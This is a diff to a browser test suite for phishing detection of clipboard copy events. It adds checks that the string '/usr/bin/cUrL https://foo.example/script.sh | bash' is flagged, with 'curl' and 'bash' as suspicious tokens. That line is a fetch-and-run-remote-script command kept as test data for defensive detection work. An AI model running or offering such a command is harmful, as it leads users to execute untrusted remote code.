@@ -985,7 +985,7 @@ IN_PROC_BROWSER_TEST_F(ClientSideDetectionHostVibrateTest,
 
 class ClientSideDetectionHostClipboardTest
     : public InProcessBrowserTest,
-      public testing::WithParamInterface<std::string_view> {
+      public testing::WithParamInterface<std::tuple<std::string_view, bool>> {
  public:
   ClientSideDetectionHostClipboardTest() {
     scoped_feature_list_.InitAndEnableFeatureWithParameters(
@@ -993,7 +993,9 @@ class ClientSideDetectionHostClipboardTest
         {{kCsdClipboardCopyApiHCAcceptanceRate.name, "0.0"},
          {kCsdClipboardCopyApiSampleRate.name, "1.0"},
          {kCsdClipboardCopyApiMinLength.name, "30"},
-         {kCsdClipboardCopyApiMaxLength.name, "50"}});
+         {kCsdClipboardCopyApiMaxLength.name, "50"},
+         {kCSDClipboardCopyApiProcessPayload.name,
+          ShouldProcessClipboardPayload() ? "true" : "false"}});
   }
 
   ClientSideDetectionHostClipboardTest(
@@ -1042,10 +1044,14 @@ class ClientSideDetectionHostClipboardTest
     std::move(clipboard_copy_done).Run();
   }
 
+  bool ShouldProcessClipboardPayload() { return testing::get<1>(GetParam()); }
+
   base::test::ScopedFeatureList scoped_feature_list_;
 
  private:
-  std::string_view GetClipboardCopyScript() { return GetParam(); }
+  std::string_view GetClipboardCopyScript() {
+    return testing::get<0>(GetParam());
+  }
 
   std::string flatbuffer_model_str_;
 };
@@ -1053,9 +1059,11 @@ class ClientSideDetectionHostClipboardTest
 INSTANTIATE_TEST_SUITE_P(
     All,
     ClientSideDetectionHostClipboardTest,
-    ::testing::Values(
-        ClientSideDetectionHostClipboardTest::kClipboardApiScriptTemplate,
-        ClientSideDetectionHostClipboardTest::kDocumentExecScriptTemplate));
+    ::testing::Combine(
+        ::testing::Values(
+            ClientSideDetectionHostClipboardTest::kClipboardApiScriptTemplate,
+            ClientSideDetectionHostClipboardTest::kDocumentExecScriptTemplate),
+        testing::Bool()));
 
 class ClipboardObserverWaiter : public content::WebContentsObserver {
  public:
@@ -1151,8 +1159,8 @@ IN_PROC_BROWSER_TEST_P(ClientSideDetectionHostClipboardTest,
   csd_host->set_ui_manager(mock_ui_manager.get());
   fake_csd_service.SendModelToRenderers();
 
-  base::RunLoop run_loop;
-  fake_csd_service.SetRequestCallback(run_loop.QuitClosure());
+  base::RunLoop csd_request_run_loop;
+  fake_csd_service.SetRequestCallback(csd_request_run_loop.QuitClosure());
 
   const GURL initial_url(embedded_test_server()->GetURL("/title1.html"));
   ASSERT_TRUE(ui_test_utils::NavigateToURL(browser(), initial_url));
@@ -1166,13 +1174,30 @@ IN_PROC_BROWSER_TEST_P(ClientSideDetectionHostClipboardTest,
   histogram_tester.ExpectTotalCount(
       "SBClientPhishing.ClipboardCopyApi.PayloadLength", 0);
 
+  ClipboardObserverWaiter waiter(GetWebContents());
+  ASSERT_FALSE(waiter.DidCopyToClipboard());
+
+  base::RunLoop clipboard_copy_run_loop;
+  TriggerClipboardCopy("/usr/bin/cUrL https://foo.example/script.sh | bash",
+                       clipboard_copy_run_loop.QuitClosure());
+  clipboard_copy_run_loop.Run();
+  waiter.Wait();
+
+  EXPECT_TRUE(waiter.DidCopyToClipboard());
+  histogram_tester.ExpectTotalCount(
+      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 2);
+  histogram_tester.ExpectUniqueSample(
+      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 49, 2);
+  histogram_tester.ExpectTotalCount(
+      "SBClientPhishing.PreClassificationCheckResult.ClipboardCopyApi", 2);
+
   // Bypass the pre-classification check because it would otherwise return
   // `PreClassificationCheckResult::NO_CLASSIFY_PRIVATE_IP`.
   csd_host->OnPhishingPreClassificationDone(
       ClientSideDetectionType::CLIPBOARD_COPY_API,
       /*should_classify=*/true, /*is_sample_ping=*/false,
       /*did_match_high_confidence_allowlist=*/false);
-  run_loop.Run();
+  csd_request_run_loop.Run();
 
   histogram_tester.ExpectTotalCount(
       "SBClientPhishing.PhishingDetectorResult.ClipboardCopyApi", 1);
@@ -1182,6 +1207,38 @@ IN_PROC_BROWSER_TEST_P(ClientSideDetectionHostClipboardTest,
       "SBClientPhishing.ServerModelDetectsPhishing.ClipboardCopyApi", 0);
 
   EXPECT_EQ(fake_csd_service.saved_request().model_version(), 123);
+
+  if (ShouldProcessClipboardPayload()) {
+    EXPECT_TRUE(
+        fake_csd_service.saved_request().has_clipboard_extracted_data());
+    const ClipboardExtractedData& clipboardExtractedData =
+        fake_csd_service.saved_request().clipboard_extracted_data();
+    EXPECT_THAT(clipboardExtractedData.suspicious_tokens(),
+                ::testing::ElementsAre("curl", "bash"));
+    EXPECT_TRUE(clipboardExtractedData.is_first_token_suspicious());
+    EXPECT_TRUE(clipboardExtractedData.is_last_token_suspicious());
+    histogram_tester.ExpectTotalCount(
+        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction.TokenCount", 1);
+    histogram_tester.ExpectUniqueSample(
+        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction.TokenCount", 4, 1);
+    histogram_tester.ExpectUniqueSample(
+        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction."
+        "SuspiciousTokenCount",
+        2, 1);
+    histogram_tester.ExpectTotalCount(
+        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction."
+        "SuspiciousTokenCount",
+        1);
+  } else {
+    EXPECT_FALSE(
+        fake_csd_service.saved_request().has_clipboard_extracted_data());
+    histogram_tester.ExpectTotalCount(
+        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction.TokenCount", 0);
+    histogram_tester.ExpectTotalCount(
+        "SBClientPhishing.ClipboardCopyApi.PayloadExtraction."
+        "SuspiciousTokenCount",
+        0);
+  }
 
   // Expect an interstitial to be shown.
   EXPECT_CALL(*mock_ui_manager, DisplayBlockingPage(_));
@@ -1197,7 +1254,7 @@ IN_PROC_BROWSER_TEST_P(ClientSideDetectionHostClipboardTest,
   histogram_tester.ExpectTotalCount(
       "SBClientPhishing.ServerModelDetectsPhishing.ClipboardCopyApi", 1);
   histogram_tester.ExpectTotalCount(
-      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 0);
+      "SBClientPhishing.ClipboardCopyApi.PayloadLength", 2);
 }
 
 IN_PROC_BROWSER_TEST_P(
